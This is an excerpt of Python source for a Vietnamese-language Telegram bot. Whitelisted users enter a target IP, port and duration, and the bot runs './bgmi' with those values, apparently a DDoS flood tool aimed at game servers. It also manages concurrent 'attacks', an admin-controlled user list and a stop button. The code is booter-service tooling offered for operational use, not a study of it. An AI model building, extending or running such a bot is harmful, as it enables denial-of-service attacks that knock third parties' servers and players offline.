...
# attack_queue = deque()
# current_attack = None
user_processes = {}   # lưu tiến trình theo user
MAX_CONCURRENT = 3    # số attack chạy song song tối đa

def run_attack(user_id, ip, port, attack_time, chat_id):
    try:
        full_command = f"./bgmi {ip} {port} {attack_time} 350"
        ...
        # chờ attack_time giây
        proc.wait(timeout=attack_time)

    except subprocess.TimeoutExpired:
        # quá time thì kill luôn
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        bot.send_message(chat_id, f"⏰ Attack hết thời gian, đã tự dừng: {ip}:{port}")

    except Exception as e:
        bot.send_message(chat_id, f"❌ Lỗi khi chạy attack: {e}")

    finally:
        # đảm bảo dọn dẹp, không sót process
...
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [int(uid) for uid in file.read().splitlines() if uid.strip()]
...
def set_time_for_target(message):
    ...
    # ✅ chỉ xử lý nếu text toàn số
    if not message.text.isdigit():
        return  # bỏ qua, cho handler khác xử lý

    time_val = int(message.text)

    # ✅ chặn số <= 0
    if time_val <= 0:
        bot.reply_to(message, "⚠️ Time phải là số dương (>0).")
        return
...
def show_all_users(message):
    ...
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = [int(uid) for uid in file.read().splitlines() if uid.strip()]
                if user_ids:
...
def save_target(message):
    ...
    # ✅ key trong user_attack_data giờ là int, đồng bộ với Attack
    user_attack_data[user_id] = (ip, port, attack_time)
...
def button_attack(message):
    ...
    # Nếu user đã có attack chưa dừng
    if user_id in user_processes:
        bot.reply_to(message, "❌ Bạn đã chạy Attack trước đó, vui lòng dừng hoặc đợi hết thời gian.")
        return

    # Nếu đã đủ số attack chạy song song
    if len(user_processes) >= MAX_CONCURRENT:
        bot.reply_to(message, f"⚠️ Đang có {MAX_CONCURRENT} attack chạy rồi, vui lòng đợi.")
        return
...
def button_stop(message):
    user_id = message.from_user.id
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "❌ Bạn không được phép dùng bot.")
        return

    if user_id in user_processes:
        try:
            proc = user_processes[user_id]
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)  # ✅ kill cả nhóm
            del user_processes[user_id]
            bot.reply_to(message, "🛑 Attack của bạn đã dừng.")
        except Exception as e:
            bot.reply_to(message, f"❌ Lỗi khi stop: {e}")
    else:
        bot.reply_to(message, "⚠️ Bạn chưa có attack nào để dừng.")
